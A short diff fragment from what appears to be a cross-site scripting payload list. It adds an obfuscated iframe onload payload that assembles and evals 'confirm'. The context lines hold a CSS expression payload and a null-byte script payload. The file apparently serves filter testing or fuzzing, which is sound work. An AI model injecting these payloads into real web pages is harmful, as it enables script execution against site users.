@@ -65,3 +65,5 @@ zzz<%div style=width:expression(prompt(933666))>
 
 qwe%00<script>alert(1)</script>
 
+<iframe/onload=action=/confir/.source+'m';eval(action)(1)>
+
